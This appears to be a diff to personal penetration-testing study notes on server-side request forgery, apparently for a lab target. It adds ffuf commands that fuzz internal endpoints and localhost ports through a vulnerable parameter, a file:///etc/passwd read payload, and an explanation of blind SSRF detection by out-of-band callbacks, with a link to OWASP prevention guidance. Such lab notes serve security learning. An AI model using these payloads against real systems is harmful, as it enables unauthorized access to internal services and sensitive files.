@@ -114,3 +114,40 @@ SSRF (Server-Side Request Forgery)
        ffuf -w ./ports.txt -u http://URL/index.php -X POST \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -d "<Post Body>" -fr "Error message shown when we try to connect"
+
+5. Accessing Endpoints through SSRF Eg : http:// url/admin , /login etc ( SSRF to access restricted internal endpoints.)
+    Eg: ffuf -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -u http://URL/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" 
+    -d "dateserver=http://SSRF/FUZZ.php&date=2024-01-01" -fr "Server at dateserver.htb Port 80"
+    Syntax : ffuf -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -u http://URL/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" 
+    -d "SSRF END BODY " -fr "Response of wrong"
+6. LFI via SSRF 
+   file:///etc/passwd
+7. The gopher Protocol
+8. Blind SSRF
+A Blind SSRF (Server-Side Request Forgery) is a type of SSRF where the response is not directly visible to the attacker.
+That means — when you send a malicious request (for example, pointing to your Burp Collaborator or nc listener), you won’t see the result or response in the application output.
+However, the server still makes the request internally, and you can detect this by observing out-of-band (OOB) interactions such as:
+A DNS lookup
+An HTTP request
+A TCP connection
+on your external server (like Burp Collaborator, interact.sh, or netcat).
+
+-> The application does not show any response or error related to your URL.
+->But, you get a DNS or HTTP hit on your-burpcollaborator.com — That confirms it’s a Blind SSRF.
+->ffuf -w ./ports.txt -u http://10.129.189.230/index.php -X POST \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" \
+  -mr "Date is unavailable. Please choose a different date!" \
+  -s | awk '{print $1}'
+which is not avaiable 
+
+-> ffuf -w ./ports.txt -u http://10.129.189.230/index.php -X POST \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" \
+  -fr "Date is unavailable. Please choose a different date!" \
+  -s | awk '{print $1}'
+-> to display whic are avaiable
+->https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html
+________________________________________________________________________________________________________________
+
+
